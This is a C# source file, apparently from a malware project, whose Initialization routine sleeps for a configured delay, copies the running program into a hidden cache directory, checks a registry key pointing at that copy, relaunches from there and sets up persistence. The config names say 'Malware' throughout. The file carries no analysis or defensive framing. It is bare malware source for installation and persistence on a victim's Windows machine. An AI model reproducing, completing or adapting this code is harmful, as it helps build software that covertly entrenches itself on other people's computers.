using System;
using System.Reflection;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Kernel.Rooting
{
    class Implementation
    {
        public static void Initialization()
        {
            Thread.Sleep(Config.MalwareInitializationDelay);
            if (Auxiliary.Assistants.EmergencyCopy()) { Environment.Exit(0); }
            if (Config.MalwareBasicImplementation) {
                if (File.Exists(Application.StartupPath + "\\" + Config.MalwareMigratePoint)) {
                    File.Delete(Application.StartupPath + "\\" + Config.MalwareMigratePoint);
                } else {
                    if (Auxiliary.Assistants.RegistryKeyExist() &&
                    File.Exists(Config.MalwareCacheDir + Config.MalwareFileName) &&
                    Assembly.GetExecutingAssembly().Location != Config.MalwareCacheDir + Config.MalwareFileName &&
                    Auxiliary.Assistants.RegistryKeyRead() == Config.MalwareCacheDir + Config.MalwareFileName) {
                        Process.Start(Config.MalwareCacheDir + Config.MalwareFileName);
                        Environment.Exit(0);
                    } else {
                        if (Assembly.GetExecutingAssembly().Location == Config.MalwareCacheDir + Config.MalwareFileName) {
                            Auxiliary.Fixation.Set();
                        } else {
                            if (!File.Exists(Config.MalwareCacheDir + Config.MalwareFileName)) {
                                Auxiliary.Task.Migrate(Config.MalwareCacheDir, Config.MalwareFileName);
                            } else {
                                Process.Start(Config.MalwareCacheDir + Config.MalwareFileName);
                                Environment.Exit(0);
                            }
                        }
                    }
                }
            }
        }
    }
}
